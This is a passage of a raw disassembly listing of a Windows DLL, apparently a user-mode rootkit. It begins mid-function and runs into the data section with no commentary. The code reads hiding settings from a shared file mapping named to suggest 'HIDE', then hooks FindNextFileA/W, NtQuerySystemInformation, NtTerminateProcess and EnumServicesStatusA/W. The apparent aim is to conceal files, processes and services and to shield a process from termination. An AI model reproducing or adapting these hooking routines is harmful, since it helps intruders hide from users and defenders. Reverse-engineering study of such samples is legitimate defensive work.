		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4157AD

loc_415798:				; CODE XREF: sub_4156E0+CBj
		lea	eax, [ebp+var_10]
		mov	edx, 4
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4157A6:				; DATA XREF: sub_4156E0+1Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415798
; ---------------------------------------------------------------------------

loc_4157AD:				; CODE XREF: sub_4156E0+C5j
					; DATA XREF: sub_4156E0+B3o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4156E0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4157B4	proc near		; CODE XREF: CODE:004158DAp

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+var_8], eax
		xor	eax, eax
		push	ebp
		push	offset loc_41586D
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, offset dword_415880
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_41584D
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		push	offset Name	; ""
		push	0		; bInheritHandle
		push	4		; dwDesiredAccess
		call	OpenFileMappingA
		mov	ds:hFileMappingObject, eax
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_4158A4
		call	sub_4156E0
		cmp	ds:hFileMappingObject, 0
		jz	short loc_415843
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		mov	eax, ds:hFileMappingObject
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	ds:dword_417820, eax
		cmp	ds:dword_417820, 0
		jz	short loc_415838
		mov	eax, offset dword_4158B0
		mov	[ebp+var_4], eax

loc_415838:				; CODE XREF: sub_4157B4+7Aj
		mov	eax, ds:hFileMappingObject
		push	eax		; hObject
		call	CloseHandle

loc_415843:				; CODE XREF: sub_4157B4+59j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415857
; ---------------------------------------------------------------------------

loc_41584D:				; DATA XREF: sub_4157B4+27o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_415857:				; CODE XREF: sub_4157B4+97j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415874

loc_415864:				; CODE XREF: sub_4157B4+BEj
		lea	eax, [ebp+var_8]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_41586D:				; DATA XREF: sub_4157B4+11o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415864
; ---------------------------------------------------------------------------

loc_415874:				; CODE XREF: sub_4157B4+B8j
					; DATA XREF: sub_4157B4+ABo
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_4157B4	endp

; ---------------------------------------------------------------------------
		align 10h
dword_415880	dd 3534h		; DATA XREF: sub_4157B4+1Co
; char Name[1]
Name		db ''                  ; DATA XREF: sub_4157B4+32o
		db 7Fh,	44h, 0
		dd 90909000h, 61685390h, 5F646572h, 45444948h, 0
		dd 0FFFFFFFFh, 0Bh
dword_4158A4	dd 0ECC7FAB9h, 0ECBFDABDh, 21D6C0h ; DATA XREF:	sub_4157B4+48o
dword_4158B0	dd 3535h		; DATA XREF: sub_4157B4+7Co
; ---------------------------------------------------------------------------

loc_4158B4:				; CODE XREF: CODE:00415C17p
		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, offset dword_417820
		xor	eax, eax
		push	ebp
		push	offset loc_415AF2
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	ebx, offset dword_415B04
		call	sub_4157B4
		mov	edx, eax
		lea	eax, [ebp-4]
		call	sub_403B8C
		mov	eax, [ebp-4]
		mov	edx, offset loc_415B10
		call	sub_403D70
		jnz	loc_415AD7
		mov	eax, [esi]
		mov	ebx, [eax+3FCh]
		mov	ds:dword_417838, ebx
		mov	eax, [esi]
		xor	ebx, ebx
		mov	bl, [eax]
		mov	eax, offset dword_417828
		mov	edx, ebx
		call	sub_403F0C
		test	ebx, ebx
		jle	short near ptr dword_415950
		mov	eax, offset dword_417828
		call	sub_403E7C
		mov	edx, eax
		mov	eax, [esi]
		inc	eax
		mov	ecx, ebx
		call	sub_402664
		lea	edx, [ebp-8]
		mov	eax, ds:dword_417828
		call	sub_4156E0
		mov	eax, [eax]
; ---------------------------------------------------------------------------
		db 2 dup(0)
		dd 0
		align 10h
dword_415950	dd 2 dup(0)		; CODE XREF: CODE:0041591Ej
		db 2 dup(0), 0B8h
		dd offset dword_417830
; ---------------------------------------------------------------------------
		mov	edx, ebx
		call	sub_403F0C
		test	ebx, ebx
		jle	short loc_41599E
		mov	eax, offset dword_417830
		call	sub_403E7C
		mov	edx, eax
		mov	eax, [esi]
		add	eax, 1FFh
		mov	ecx, ebx
		call	sub_402664
		lea	edx, [ebp-0Ch]
		mov	eax, ds:dword_417830
		call	sub_4156E0
		mov	edx, [ebp-0Ch]
		mov	eax, offset dword_417830
		call	sub_4039E8

loc_41599E:				; CODE XREF: CODE:00415968j
		mov	eax, [esi]
		xor	ebx, ebx
		mov	bl, [eax+0FFh]
		mov	eax, offset dword_41782C
		mov	edx, ebx
		call	sub_403F0C
		test	ebx, ebx
		jle	short loc_4159EC
		mov	eax, offset dword_41782C
		call	sub_403E7C
		mov	edx, eax
		mov	eax, [esi]
		add	eax, 100h
		mov	ecx, ebx
		call	sub_402664
		lea	edx, [ebp-10h]
		mov	eax, ds:dword_41782C
		call	sub_4156E0
		mov	edx, [ebp-10h]
		mov	eax, offset dword_41782C
		call	sub_4039E8

loc_4159EC:				; CODE XREF: CODE:004159B6j
		mov	eax, [esi]
		xor	ebx, ebx
		mov	bl, [eax+2FDh]
		mov	eax, offset dword_417834
		mov	edx, ebx
		call	sub_403F0C
		test	ebx, ebx
		jle	short loc_415A3A
		mov	eax, offset dword_417834
		call	sub_403E7C
		mov	edx, eax
		mov	eax, [esi]
		add	eax, 2FEh
		mov	ecx, ebx
		call	sub_402664
		lea	edx, [ebp-14h]
		mov	eax, ds:dword_417834
		call	sub_4156E0
		mov	edx, [ebp-14h]
		mov	eax, offset dword_417834
		call	sub_4039E8

loc_415A3A:				; CODE XREF: CODE:00415A04j
		lea	eax, [ebp-1Ch]
		call	sub_4156A4
		mov	eax, [ebp-1Ch]
		lea	edx, [ebp-18h]
		call	sub_412A18
		mov	edx, [ebp-18h]
		mov	eax, offset dword_417824
		call	sub_4039E8
		mov	eax, ds:dword_41782C
		call	sub_403C24
		mov	ecx, eax
		add	ecx, ecx
		inc	ecx
		mov	edx, offset word_417A44
		mov	eax, ds:dword_41782C
		call	sub_404408
		mov	eax, ds:dword_417824
		call	sub_403C24
		mov	ecx, eax
		add	ecx, ecx
		inc	ecx
		mov	edx, offset word_417E54
		mov	eax, ds:dword_417824
		call	sub_404408
		mov	eax, ds:dword_417828
		call	sub_403C24
		mov	ecx, eax
		add	ecx, ecx
		inc	ecx
		mov	edx, offset String2
		mov	eax, ds:dword_417828
		call	sub_404408
		mov	eax, ds:dword_417830
		call	sub_403C24
		mov	ecx, eax
		add	ecx, ecx
		inc	ecx
		mov	edx, offset word_417C4C
		mov	eax, ds:dword_417830
		call	sub_404408
		mov	ebx, (offset loc_415B10+4)

loc_415AD7:				; CODE XREF: CODE:004158F6j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415AF9

loc_415AE4:				; CODE XREF: CODE:00415AF7j
		lea	eax, [ebp-1Ch]
		mov	edx, 7
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_415AF2:				; DATA XREF: CODE:004158CAo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415AE4
; ---------------------------------------------------------------------------

loc_415AF9:				; CODE XREF: CODE:00415AF1j
					; DATA XREF: CODE:00415ADFo
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 4
dword_415B04	dd 373737h, 0FFFFFFFFh,	2 ; DATA XREF: CODE:004158D5o
; ---------------------------------------------------------------------------

loc_415B10:				; DATA XREF: CODE:004158ECo
					; CODE:00415AD2o
		xor	eax, 36000035h
		aaa
		cmp	[eax], al

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_415B18	proc near		; DATA XREF: CODE:00415BF0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_415B69
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, offset dword_417834
		call	sub_403994
		mov	eax, offset dword_417830
		call	sub_403994
		mov	eax, offset dword_41782C
		call	sub_403994
		mov	eax, offset dword_417828
		call	sub_403994
		mov	eax, offset dword_417824
		call	sub_403994
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415B70

loc_415B68:				; CODE XREF: sub_415B18+56j
		retn
; ---------------------------------------------------------------------------

loc_415B69:				; DATA XREF: sub_415B18+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415B68
; ---------------------------------------------------------------------------

loc_415B70:				; CODE XREF: sub_415B18:loc_415B68j
					; DATA XREF: sub_415B18+4Bo
		pop	ebp
		retn
sub_415B18	endp

; ---------------------------------------------------------------------------
		align 4
dword_415B74	dd 0Fh			; DATA XREF: CODE:00415BFFo
		dd offset off_415B7C
off_415B7C	dd offset loc_40510C	; DATA XREF: CODE:00415B78o
		dd offset sub_4050DC
		dd offset sub_404E74
		dd offset sub_404E20
		dd offset sub_405594
		dd offset sub_405564
		dd offset sub_405144
		dd offset sub_405114
		dd offset sub_40545C
		dd offset sub_40542C
		dd offset sub_406650
		dd offset sub_406620
		dd offset sub_4055CC
		dd offset sub_40559C
		dd offset sub_4070D4
		dd offset sub_40707C
		dd offset sub_409D80
		dd offset sub_409D50
		dd offset sub_40BD50
		dd offset sub_40BD20
		dd offset sub_411B3C
		dd offset sub_411AB4
		dd offset sub_411E24
		dd offset sub_411DF4
		dd offset sub_41520C
		dd offset sub_41508C
		dd offset sub_4152BC
		dd offset sub_41528C
		align 10h
		dd offset sub_415B18

; =============== S U B	R O U T	I N E =======================================


; BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
		public DllEntryPoint
DllEntryPoint	proc near

hinstDLL	= dword	ptr  4
fdwReason	= dword	ptr  8
lpReserved	= dword	ptr  0Ch

		mov	eax, 1
		retn	0Ch
DllEntryPoint	endp

; ---------------------------------------------------------------------------
		mov	[ebp-40h], eax
		mov	eax, offset dword_415B74
		call	sub_405094
		xor	eax, eax
		push	ebp
		push	offset loc_415D25
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	loc_4158B4
		mov	edx, eax
		lea	eax, [ebp-40h]
		call	sub_403B8C
		mov	eax, [ebp-40h]
		mov	edx, offset dword_415D3C
		call	sub_403D70
		jnz	loc_415D0F
		push	0
		push	offset dword_418060
		push	offset sub_415398
		push	offset aFindnextfilea ;	"FindNextFileA"
		push	offset aKernel32_dll_0 ; "kernel32.dll"
		call	sub_410E30
		push	0
		push	offset dword_418064
		push	offset sub_41542C
		push	offset aFindnextfilew ;	"FindNextFileW"
		push	offset aKernel32_dll_0 ; "kernel32.dll"
		call	sub_410E30
		call	GetVersion_0
		test	eax, 80000000h
		jnz	loc_415D0F
		cmp	ds:dword_417838, 0
		jz	short loc_415CCB
		push	0
		push	offset dword_41805C
		push	offset sub_4152C4
		push	offset aNtquerysystemi ; "NtQuerySystemInformation"
		push	offset aNtdll_dll ; "ntdll.dll"
		call	sub_410E30
		call	GetCurrentProcessId
		cmp	eax, ds:dword_417838
		jz	short loc_415CCB
		push	0
		push	offset dword_418070
		push	offset sub_41536C
		push	offset aNtterminatepro ; "NtTerminateProcess"
		push	offset aNtdll_dll ; "ntdll.dll"
		call	sub_410E30

loc_415CCB:				; CODE XREF: CODE:00415C86j
					; CODE:00415CAEj
		mov	eax, ds:dword_417834
		call	sub_403C24
		test	eax, eax
		jz	short loc_415D0F
		push	0
		push	offset dword_41806C
		push	offset sub_41557C
		push	offset aEnumservicesst ; "EnumServicesStatusW"
		push	offset aAdvapi32_dll ; "ADVAPI32.DLL"
		call	sub_410E30
		push	0
		push	offset dword_418068
		push	offset sub_4154A8
		push	offset aEnumservices_0 ; "EnumServicesStatusA"
		push	offset aAdvapi32_dll ; "ADVAPI32.DLL"
		call	sub_410E30

loc_415D0F:				; CODE XREF: CODE:00415C33j
					; CODE:00415C79j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415D2C

loc_415D1C:				; CODE XREF: CODE:00415D2Aj
		lea	eax, [ebp-40h]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_415D25:				; DATA XREF: CODE:00415C0Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415D1C
; ---------------------------------------------------------------------------

loc_415D2C:				; CODE XREF: CODE:00415D24j
					; DATA XREF: CODE:00415D17o
		call	sub_4038A4
; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 3
dword_415D3C	dd 383736h		; DATA XREF: CODE:00415C29o
aFindnextfilea	db 'FindNextFileA',0    ; DATA XREF: CODE:00415C45o
		align 10h
aKernel32_dll_0	db 'kernel32.dll',0     ; DATA XREF: CODE:00415C4Ao
					; CODE:00415C65o
		align 10h
aFindnextfilew	db 'FindNextFileW',0    ; DATA XREF: CODE:00415C60o
		align 10h
aNtquerysystemi	db 'NtQuerySystemInformation',0 ; DATA XREF: CODE:00415C94o
		align 4
aNtdll_dll	db 'ntdll.dll',0        ; DATA XREF: CODE:00415C99o
					; CODE:00415CC1o
		align 4
aNtterminatepro	db 'NtTerminateProcess',0 ; DATA XREF: CODE:00415CBCo
		align 4
aEnumservicesst	db 'EnumServicesStatusW',0 ; DATA XREF: CODE:00415CE5o
aAdvapi32_dll	db 'ADVAPI32.DLL',0     ; DATA XREF: CODE:00415CEAo
					; CODE:00415D05o
		align 10h
aEnumservices_0	db 'EnumServicesStatusA',0 ; DATA XREF: CODE:00415D00o
		dd 7 dup(0)
		dd 80h dup(?)
CODE		ends

; Section 2. (virtual address 00016000)
; Virtual size			: 00000E84 (   3716.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00015200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 416000h
dword_416000	dd 0			; DATA XREF: sub_40378C+Ar
					; sub_4037E8+2w ...
dword_416004	dd 0			; DATA XREF: sub_4025B0w
					; sub_40378C+37r ...
byte_416008	db 2			; DATA XREF: sub_404E74+Dw
		db 8Dh,	40h, 0
dword_41600C	dd 0			; DATA XREF: sub_4040D0r sub_4040D0+9r
dword_416010	dd 0			; DATA XREF: sub_4041E0r sub_4041E0+9r
dword_416014	dd 0			; DATA XREF: DATA:off_416E6Co
word_416018	dw 1332h		; DATA XREF: sub_402BEC+6r
					; sub_402BEC:loc_402C64r ...
		dw 0C08Bh
byte_41601C	db 0			; DATA XREF: sub_402EB8r sub_402ED4r ...
		db 8Dh,	40h, 0
byte_416020	db 0			; DATA XREF: sub_402FBC+52r
					; sub_402FBC:loc_403049r ...
		db 8Dh,	40h, 0
byte_416024	db 0			; DATA XREF: sub_403818:loc_403879r
		db 8Dh,	40h, 0
dword_416028	dd 0			; DATA XREF: sub_4047D0r sub_404C90r ...
dword_41602C	dd 0			; DATA XREF: sub_404C34+Cr
off_416030	dd offset sub_401F4C	; DATA XREF: sub_402520+5r
					; sub_402560+3Fr
off_416034	dd offset sub_4020DC	; DATA XREF: sub_402540+5r
					; sub_402560+26r
off_416038	dd offset sub_40245C	; DATA XREF: sub_402560+Dr
byte_41603C	db 0			; DATA XREF: sub_4025BC+36r
aRsu		db '',0
aFxn@		db '@',0
; char Caption[]
Caption		db 'Error',0            ; DATA XREF: sub_403818+6Co
		dw 0C08Bh
; char Text[]
Text		db 'Runtime error     at 00000000',0 ; DATA XREF: sub_40378C+3o
					; sub_403818+32o ...
		dw 0C08Bh
byte_416080	db 30h			; DATA XREF: sub_40378C+41r
		db 31h,	32h, 33h
		dd 37363534h, 42413938h, 46454443h
; DWORD	dwTlsIndex
dwTlsIndex	dd 0FFFFFFFFh		; DATA XREF: sub_404F8C+Cr
					; sub_404F8C+37r ...
dword_416094	dd 6 dup(0)		; DATA XREF: sub_405088o sub_405094o
off_4160AC	dd offset sub_405024	; DATA XREF: sub_405094+3Bo
		dd offset sub_404FD0
		dd offset sub_404F8C
		dd offset sub_404FFC
byte_4160BC	db 0			; DATA XREF: sub_4059C4+32r
					; sub_4059C4+3Dr ...
		db 1, 2, 3
		dd 7060504h, 0B0A0908h,	0F0E0D0Ch, 13121110h, 17161514h
		dd 1B1A1918h, 1F1E1D1Ch, 23222120h, 27262524h, 2B2A2928h
		dd 2F2E2D2Ch, 33323130h, 37363534h, 3B3A3938h, 3F3E3D3Ch
		dd 63626140h, 67666564h, 6B6A6968h, 6F6E6D6Ch, 73727170h
		dd 77767574h, 5B7A7978h, 5F5E5D5Ch, 63626160h, 67666564h
		dd 6B6A6968h, 6F6E6D6Ch, 73727170h, 77767574h, 7B7A7978h
		dd 7F7E7D7Ch, 83828180h, 87868584h, 8B9A8988h, 8F9E8D9Ch
		dd 93929190h, 97969594h, 9B9A9998h, 0FF9E9D9Ch,	0A3A2A1A0h
		dd 0A7A6A5A4h, 0ABAAA9A8h, 0AFAEADACh, 0B3B2B1B0h, 0B7B6B5B4h
		dd 0BBBAB9B8h, 0BFBEBDBCh, 0E3E2E1E0h, 0E7E6E5E4h, 0EBEAE9E8h
		dd 0EFEEEDECh, 0F3F2F1F0h, 0D7F6F5F4h, 0FBFAF9F8h, 0DFFEFDFCh
		dd 0E3E2E1E0h, 0E7E6E5E4h, 0EBEAE9E8h, 0EFEEEDECh, 0F3F2F1F0h
		dd 0F7F6F5F4h, 0FBFAF9F8h, 0FFFEFDFCh
; HANDLE hObject
hObject		dd 0			; DATA XREF: sub_4066E4r sub_4066E4+7w
dword_4161C0	dd 0			; DATA XREF: sub_408888+165r
word_4161C4	dw 4211h		; DATA XREF: sub_408368+DCr
		dw 42E4h
		dd 20E42011h, 8C428401h, 0
		dd 42E44211h, 20E42011h, 8C428401h, 0
		dd 42E44211h, 20E42011h, 8C428401h, 0
		dd 42E44211h, 20E42011h, 8C428401h, 0
		dd 42E44211h, 20E42011h, 8C428401h, 80000000h, 42E44211h
		dd 20E42011h, 8C428401h, 80000000h, 42E44211h, 20E42011h
		dd 8C428401h, 80000000h, 2E40211h, 0E40011h, 0C420401h
		dd 80000000h, 8	dup(60456045h),	4 dup(450045h),	4 dup(60456045h)
		dd 80000000h, 421A00E4h, 2 dup(0)
		dd 2CE40C00h, 24E40400h, 2 dup(0)
		dd 8 dup(14001400h), 0DA00510h,	5A00510h, 2E40211h, 0A2E4A211h
		dd 42E44211h, 20E42011h, 20E442E3h, 1A000E3h, 0E0460000h
		dd 3 dup(0E046E046h), 8000h, 2 dup(0)
		dd 80000000h, 81428101h, 3420301h, 2 dup(0)
		dd 0C420401h, 0
		dd 80008000h, 0
		dd 4 dup(64046404h), 4 dup(6C456C45h), 45A04510h, 800h
		dd 20E420E4h, 4DA04510h, 0
		dd 800h, 4000000h, 0
		dd 2 dup(41A04110h), 84008400h,	80000000h, 4 dup(80008h)
		dd 2 dup(14001400h), 84428401h,	6420601h, 1C001C00h, 14000000h
		dd 80478007h, 2470207h,	3 dup(0)
		dw 2 dup(8), 0
		align 10h
		dd 1A04110h
word_4163C4	dw 118h			; DATA XREF: sub_408368+AAr
		dw 120h
		dd 20E420E4h, 0FFFFh, 2	dup(0)
		dd 0FFFFFFFFh, 110FFFFh, 52D0000h, 2 dup(23F003Fh), 3F003Fh
		dd 23F003Fh, 0FFFF0110h, 3 dup(0FFFFFFFFh), 40234023h
		dd 2230223h, 2 dup(0FFFFFFFFh),	23F003Fh, 23F002Fh, 3D003Dh
		dd 3F003Fh, 80000000h, 80008000h, 0
		dd 5 dup(0FFFFFFFFh), 8	dup(20E420E4h),	3F4227h, 7 dup(3F003Fh)
		dd 7 dup(0ED00EDh), 0ED0065h, 4A804EDh,	4A804A8h, 0ED00EDh
		dd 0EDh, 3 dup(0FFFFFFFFh), 2ED0265h, 8	dup(1C001C00h)
		dd 8 dup(41104110h), 0
		dd 2E48000h, 43E447E4h,	0C2E4C211h, 0
		dd 42E40000h, 43E447E4h, 20E40020h, 0C2E4C211h,	42E420E4h
		dd 22E420E4h, 211C2154h, 0FFFFFFFFh, 42E405A0h,	20E420E4h
		dd 211C2154h, 0A2E4A211h, 224043Fh, 24AC0465h, 8128043Fh
		dd 4 dup(60056005h), 0EDFFFFh, 2 dup(0ED00EDh),	20AC02EDh
		dd 7 dup(0ED00EDh), 2ED003Fh, 4	dup(0ED00EDh), 0EDFFFFh
		dd 6 dup(0ED00EDh), 0EDh
dword_4165C4	dd 51000F6h, 4110FFFFh,	81104110h, 81108110h, 5108110h
					; DATA XREF: sub_408368+11Co
		dd 4110FFFFh, 81104110h, 81108110h, 0F78110h, 0FFFF0DA0h
		dd 41A041A0h, 2	dup(81A081A0h),	0FFFF0DA0h, 41A041A0h
		dd 2 dup(81A081A0h), 12000D8h, 3 dup(1200120h),	360120h
		dd 300036h, 360030h, 360036h, 0D90036h,	0FFFF0120h, 1200120h
		dd 2 dup(1180110h), 300030h, 300000h, 2	dup(0)
		dd 12000DAh, 3 dup(1200120h), 360120h, 360036h,	0FFFF0036h
		dd 0FFFF0000h, 0DBFFFFh, 0FFFF0120h, 1200120h, 2 dup(130FFFFh)
		dd 2 dup(360036h), 360000h, 0FFFF0036h,	12800DCh, 3 dup(1280128h)
		dd 2360128h, 300236h, 2360030h,	2360236h, 0DD0236h, 0FFFF0128h
		dd 1280128h, 0FFFF0110h, 1180110h, 3 dup(300030h), 0FFFFFFFFh
		dd 11800DEh, 3 dup(1180118h), 2360118h,	300236h, 2 dup(2360236h)
		dd 0DF0236h, 0FFFF0118h, 1180118h, 2 dup(1280130h), 2 dup(300030h)
		dd 360000h, 0FFFF0036h
byte_416718	db 6			; DATA XREF: sub_408368+EFr
		db 3 dup(6)
		dd 0C0C30606h, 57575757h, 0C35757h, 5050505h, 0C0C30505h
		dd 0A2A2A2A2h, 0C0C3A2A2h, 8080808h, 24000808h,	0ADADADADh
		dd 2500ADADh, 0BCBCBCBCh, 100BCBCh, 1A1A1A1Ah, 4001A1Ah
		dd 2 dup(2E2E2E2Eh), 2 dup(26262626h), 2 dup(97979797h)
		dd 2 dup(7C7C7C7Ch), 0A0BC1C4h,	0
		dd 2C972C97h, 0C65AC72Fh, 4 dup(36363636h), 0DEDEDEDEh
		dd 0BABAB2B2h, 4A4A4A4Ah, 7C4A3C4Ah, 0BABABA56h, 0BABABABAh
		dd 0B613BFBEh, 39A0C2C5h, 4A4A4A4Ah, 0C91CC852h, 0CBACB2B2h
		dd 0CCA3CA42h, 4 dup(4A4A4A4Ah), 9D9DE0E0h, 4A4A3B3Eh
		dd 9D9D3D29h, 35333031h, 0E0E0E0E0h, 0BBA10203h, 0E9E8E7E2h
		dd 0ECEBEAE2h, 37434445h, 59592D2Dh, 38383813h,	59592D2Dh
		dd 3200h, 0E1E1182Bh, 0AB16A914h, 0DFDFAA15h
byte_416818	db 0D6h			; DATA XREF: sub_408368+BDr
		db 0D5h, 3Ah, 46h
		dd 4117AF00h, 0B734h, 2AD300h, 4EE3D2D2h, 4DE4B4B5h, 0E5h
		dd 0
aJjjj		db 'JJJJ',0
		align 10h
		dd 51214B4Bh, 1FB32223h, 9B9A9CB8h, 0B1B0h, 2 dup(0)
		dd 4 dup(19191919h), 999FA84Fh,	0BD5809EDh, 0DBDC5507h
		dd 482749AEh, 5C949593h, 5D6E6F6Dh, 5B90928Fh, 0D14C9196h
		dd 0D9D8DAD4h, 286B6C6Ah, 0
		dd 0D1CE0000h, 4 dup(36363636h), 4 dup(0A4A4A4A4h), 0F20C0C3h
		dd 1D1DA5A5h, 129EC0C3h, 2CE6A6A6h, 11471D1Dh, 5454403Fh
		dd 10D70000h, 53530D0Ch, 501BB9B9h, 1EA77071h, 2 dup(0E0E0E0Eh)
		dd 85848600h, 77D07A60h, 66768D8Ch, 67746463h, 69828368h
		dd 0CFDD7978h, 7D758B8Ah, 98736261h, 807F8100h,	0CD7E727Bh
		dd 89888E87h, 5F655Eh
dword_416918	dd 0			; DATA XREF: sub_409B20+2Cw
					; sub_409B20+39r ...
byte_41691C	db 0			; DATA XREF: sub_409B20:loc_409BD8w
					; sub_409BE8:loc_409BF6r
		db 8Dh,	40h, 0
byte_416920	db 0			; DATA XREF: sub_409B20+2r
					; sub_409B20+Fw ...
		db 8Dh,	40h, 0
dword_416924	dd 0			; DATA XREF: sub_409CC0:loc_409CE6r
					; sub_409CC0+39w ...
dword_416928	dd 0			; DATA XREF: sub_409DD4r
					; sub_409DD4+22w ...
dword_41692C	dd 0			; DATA XREF: sub_409DD4+31w
					; sub_40A0D4+2D8r ...
dword_416930	dd 0			; DATA XREF: sub_409DD4+40w
dword_416934	dd 0			; DATA XREF: sub_409DD4+4Fw
dword_416938	dd 0			; DATA XREF: sub_409DD4+13w
					; sub_40A0D4+272r ...
dword_41693C	dd 0FFFFFFFFh		; DATA XREF: sub_40A0D4+66r
					; sub_40A0D4+9Ew ...
dword_416940	dd 0			; DATA XREF: sub_40A770+28r
					; sub_40A770+3Bw ...
dword_416944	dd 0			; DATA XREF: sub_40A890+17r
					; sub_40A890+2Aw ...
dword_416948	dd 0			; DATA XREF: sub_40A770+4Aw
					; sub_40A770+AAr
dword_41694C	dd 0			; DATA XREF: sub_40A6B0+1Ar
					; sub_40A6B0+58w ...
dword_416950	dd 0			; DATA XREF: sub_40A6B0+69w
					; sub_40A6B0+7Dr ...
dword_416954	dd 0			; DATA XREF: sub_409EB0r
					; sub_409EB0+13w
dword_416958	dd 0			; DATA XREF: sub_409EB0+22w
					; sub_40AB44+1EAr ...
dword_41695C	dd 0			; DATA XREF: sub_409EB0+31w
dword_416960	dd 0			; DATA XREF: sub_409EB0+40w
dword_416964	dd 0			; DATA XREF: sub_409EB0+4Fw
					; sub_40B410+682r
dword_416968	dd 0			; DATA XREF: sub_40A0D4:loc_40A24Ar
					; sub_40A0D4+189w ...
dword_41696C	dd 0			; DATA XREF: sub_40A0D4+AEw
					; sub_40A0D4:loc_40A1ACr ...
dword_416970	dd 0			; DATA XREF: sub_40A0D4+D3w
					; sub_40A0D4+16Br
; DWORD	dwProcessId
dwProcessId	dd 0			; DATA XREF: sub_40A478+33r
					; sub_40A478+A2w ...
; DWORD	dword_416978
dword_416978	dd 0			; DATA XREF: sub_40A57C+26r
					; sub_40A57C+72w ...
dword_41697C	dd 0			; DATA XREF: sub_40A920+14r
					; sub_40A920+29w ...
dword_416980	dd 0			; DATA XREF: sub_40A920:loc_40A94Er
					; sub_40A920+41w ...
dword_416984	dd 0			; DATA XREF: sub_40A920+50w
					; sub_40AA0C+24r ...
dword_416988	dd 0			; DATA XREF: sub_40A920+5Fw
					; sub_40AA0C:loc_40AA3Br ...
dword_41698C	dd 0			; DATA XREF: sub_40AF50:loc_40B013r
					; sub_40AF50+1D7w ...
dword_416990	dd 0			; DATA XREF: sub_40AF50+1DFw
					; sub_40AF50+1FAr
dword_416994	dd 0			; DATA XREF: sub_40ADB8+21r
					; sub_40ADF0+F9r ...
dword_416998	dd 0			; DATA XREF: sub_40ADB8+Dr
					; sub_40ADF0+A9r ...
dword_41699C	dd 0			; DATA XREF: sub_40ADF0+D5r
					; sub_40ADF0+E3r ...
dword_4169A0	dd 0			; DATA XREF: sub_40ADF0+DCr
					; sub_40AF50+64w
dword_4169A4	dd 0			; DATA XREF: sub_40ADF0+EAr
					; sub_40AF50+73w
dword_4169A8	dd 0			; DATA XREF: sub_40ADB8+17r
					; sub_40ADF0+127r ...
dword_4169AC	dd 0			; DATA XREF: sub_40ADF0+96r
					; sub_40ADF0+11Ar ...
dword_4169B0	dd 0			; DATA XREF: sub_40ADF0+B4r
					; sub_40AF50+A0w
dword_4169B4	dd 0			; DATA XREF: sub_40ADF0+20r
					; sub_40AF50+AFw
dword_4169B8	dd 0			; DATA XREF: sub_40ADF0+62r
					; sub_40AF50+BEw
dword_4169BC	dd 42474FFh, 0B8h, 50D0FF00h, 80006850h, 6A0000h, 68h
					; DATA XREF: sub_40B410+5D1o
		dd 6800h, 0B80000h, 0FF000000h,	408DE0h
dword_4169E4	dd 0			; DATA XREF: sub_40BB64+127r
					; sub_40BB64+13Aw ...
byte_4169E8	db 0			; DATA XREF: sub_410970+35Br
		db 8Dh,	40h, 0
dword_4169EC	dd 0			; DATA XREF: sub_40BD58+35w
dword_4169F0	dd 0			; DATA XREF: sub_40BD58+44w
					; sub_40CCE0+Er
dword_4169F4	dd 0			; DATA XREF: sub_40BD58+53w
dword_4169F8	dd 0			; DATA XREF: sub_40BD58+62w
dword_4169FC	dd 0			; DATA XREF: sub_40BD58r
